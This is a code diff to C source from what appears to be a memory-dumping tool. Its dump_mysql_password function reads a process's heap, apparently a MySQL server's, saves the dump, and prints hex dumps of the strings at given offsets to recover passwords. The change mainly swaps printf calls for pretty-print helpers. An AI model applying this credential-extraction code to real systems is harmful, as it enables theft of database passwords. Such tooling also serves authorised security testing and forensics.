@@ -10,6 +10,7 @@
 #include <string.h>
 
 #include "dump-password.h"
+#include "pretty-print.h"
 #include "globals.h"
 #include "heap.h"
 
@@ -25,27 +26,29 @@ void dump_mysql_password(pid_t pid, off_t *offset){
 
     int fd;
 
-    printf("[*] getting heap address of pid %d\n", pid);
+    info("getting heap address of pid %d\n", pid);
     if(getheapmap(pid, &heap)){
-        printf("[-] failed to find the heap address\n");
+        bad("failed to find the heap address\n");
         return;
     }
 
-    printf("[+] heap = %lx-%lx\n", heap.start_addr, heap.end_addr);
+    good("heap = %lx-%lx\n", heap.start_addr, heap.end_addr);
 
     len = heap.end_addr - heap.start_addr;
     char *dump = malloc(heap.end_addr - heap.start_addr);
     if(dump == NULL){
-        printf("malloc failed\n");
+        bad("malloc failed\n");
         return;
     }
 
     n = memreadfunc(pid, dump, len, heap.start_addr);
-    printf("[+] %zd bytes read of %zu\n", n, len);
     if(n <= 0){
+        bad("failed to read memory\n");
         free(dump);
         return;
     }
+
+    good("%zd bytes read of %zu\n", n, len);
 
     if(output_folder){
         len = strlen(output_folder)+64;
@@ -55,12 +58,12 @@ void dump_mysql_password(pid_t pid, off_t *offset){
 
         fd = open(output_file, O_CREAT|O_TRUNC|O_RDWR, 0644);
         if(fd == -1){
-            printf("[-] failed open %s\n", output_file);
+            bad("failed open %s\n", output_file);
         } else {
             write(fd, dump, n);
             close(fd);
 
-            printf("[+] heap saved to %s\n", output_file);
+            good("heap saved to %s\n", output_file);
         }
 
         free(output_file);
@@ -68,11 +71,12 @@ void dump_mysql_password(pid_t pid, off_t *offset){
 
     while((aux = *offset++)){
         if(aux >= (size_t)n){
-            printf("[-] skipping offset 0x%lx, out of bounds\n", aux);
+            bad("skipping offset 0x%lx, out of bounds\n", aux);
             continue;
         }
 
-        printf("[+] string at offset 0x%lx: %s\n", aux, dump+aux);
+        good("string at offset 0x%lx:\n", aux);
+        hdump(dump+aux, n-aux);
     }
 
     free(dump);
